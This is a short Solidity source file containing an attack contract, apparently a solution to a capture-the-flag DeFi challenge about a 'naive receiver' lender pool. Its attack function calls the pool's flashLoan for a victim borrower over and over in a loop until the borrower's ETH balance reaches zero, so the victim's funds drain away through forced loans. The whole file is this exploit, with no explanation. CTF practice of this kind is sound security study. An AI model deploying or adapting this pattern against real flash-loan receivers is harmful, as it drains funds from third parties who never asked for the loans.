// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackNaiveReceiverLenderPool {
    function attack(address pool, address borrower, uint256 borrowAmount) external {
        while(borrower.balance > 0) {
            IPool(pool).flashLoan(borrower, borrowAmount);
        }
    }
}
